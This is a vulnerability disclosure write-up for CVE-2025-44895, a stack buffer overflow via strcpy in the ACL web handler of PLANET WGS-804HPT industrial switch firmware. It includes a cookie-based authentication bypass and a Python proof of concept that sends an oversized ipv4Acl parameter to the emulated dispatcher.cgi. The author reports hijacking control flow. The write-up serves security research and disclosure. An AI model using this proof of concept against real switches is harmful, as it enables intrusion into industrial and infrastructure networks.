---
title: web_acl_ipv4BasedAceAdd_post-ipv4Acl-StackOverflow
date: 2025-04-18 15:32:49
tags: cve
---



**Affected Product**: FW-WGS-804HPT

**Affected Firmware Versions**:  v1.305b241111

**Vulnerability Type**: Buffer Overflow

**CVE Identifier**: CVE-2025-44895



# FW-WGS-804HPT_v1.305b241111 introduced

The WGS-804HPT-V2 is a ruggedized industrial-grade Ethernet switch designed for harsh environments and mission-critical applications. As part of PLANET Technology's Industrial Automation Series, this 8-port managed switch combines Power over Ethernet (PoE+) capabilities with industrial durability, making it ideal for building automation, smart infrastructure, and IoT deployments.



Official Product Page: https://www.planet.com.tw/en/product/wgs-804hpt-v2





# web_acl_ipv4BasedAceAdd_post-ipv4Acl

I discovered a  stack overflow vulnerability in the Planet router.

By analyzing the dispatcher file in the bin directory, I found that the function web_acl_ipv4BasedAceAdd  contains a stack overflow vulnerability.

The stack overflow can be triggered by ipv4Aclkey value, which leads to a strcpy stack overflow.

![image-20250321152223389](../res/202503211522484-174514063849415.png)

In the main function, there is an account authentication detection. We create a cookie_0 in the tmp directory, with the content of "20 0 0", and its function is to create a cookie with sufficient permissions to access this route.

```json
20 0 0
```



![image-20250416151600679](../res/image-20250416151600679-17447880314529.png)





﻿The content of the **poc**.py file is as follows:

```json
import os


a = 0xC0E
var_name = "ipv4Acl"
b = 'a' * 0x300

poc_content = f"&cmd={a}&{var_name}={b}"
with open('poc', 'w') as f:
    f.write(poc_content)


command = (
    "sudo chroot . ./qemu-mips-static "
    "-E REQUEST_METHOD=POST "
    "-E HTTP_COOKIE='hid=0' "
    "-L ./lib "
    "-g 1234 "
    "./dispatcher.cgi "
    "< poc"  
)


os.system(command)


```

![image-20250416151814991](res/image-20250416151814991-174478804293910.png)

Through IDA, it can be seen that the stack space is 0xb0.

![image-20250416152336647](../res/image-20250416152336647-174478821841413.png)

![image-20250416152851713](../res/image-20250416152851713-174478853300914.png)



![image-20250416152949388](../res/image-20250416152949388-174478859218115.png)

Through the above image, we can see that we have overflowed to 0x318 and successfully hijacked the control flow. If necessary, more can be overflowed.
